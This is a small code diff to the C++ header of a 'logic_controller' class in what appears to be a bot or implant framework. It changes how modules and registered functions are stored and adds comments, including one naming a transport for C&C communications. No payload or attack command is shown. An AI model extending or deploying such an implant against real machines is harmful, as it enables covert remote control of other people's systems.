@@ -52,12 +52,18 @@ class logic_controller {
   /**
    * @brief Modules this bot can run and where they are located
    */
-  std::map<std::string, ModuleInfo> modules;
+  std::map<std::string, std::shared_ptr<Module>> modules;
   /**
    * @brief The transport, used for C&C communications
    */
   std::unique_ptr<Transport> transport;
+  /**
+   * @brief Contains the info for this implant.
+   */
   ImplantInfo implantInfo;
+  /**
+   * @brief A list of info about threads running. To be used by the thread manager.
+   */
   std::vector<ThreadInfo> threadInfos;
 
  public:
@@ -65,11 +71,13 @@ class logic_controller {
    * @brief Constructor for Logic Controller
    */
   logic_controller();
+
   /**
    * @brief Add a function to the logic controller that is not in a module
    * @param func The pointer the function you want to register
+   * TODO maybe remove this.
    */
-  void AddFunction(void *func);
+  void AddFunction(std::function<std::string(std::string)> func);
 
   /**
    * @brief Start the registration process
